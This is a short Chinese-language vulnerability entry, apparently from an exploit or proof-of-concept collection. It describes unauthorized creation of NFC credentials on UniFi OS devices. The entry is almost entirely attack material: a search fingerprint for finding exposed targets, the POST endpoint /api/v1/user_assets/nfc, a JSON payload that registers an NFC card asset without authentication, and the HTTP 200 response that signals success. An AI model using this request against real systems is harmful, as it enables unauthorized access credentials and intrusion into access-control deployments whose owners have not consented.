# UniFinfc存在未授权创建权限漏洞

UniFinfc ｜ 未授权访问 ｜ —
- **指纹**：`body="UniFi OS"`
- **请求**：`POST /api/v1/user_assets/nfc HTTP/1.1`

**Payload**
```
"alias": "ijdsqx",
"asset_id": "1",
"need_provision": true,
"nfc_id": "1",
"plain_token": "1",
"sys_id": "1",
"token": "1",
"ua_card_id": "1",
"ua_card_pub_key": "1"
```
- **响应特征**：200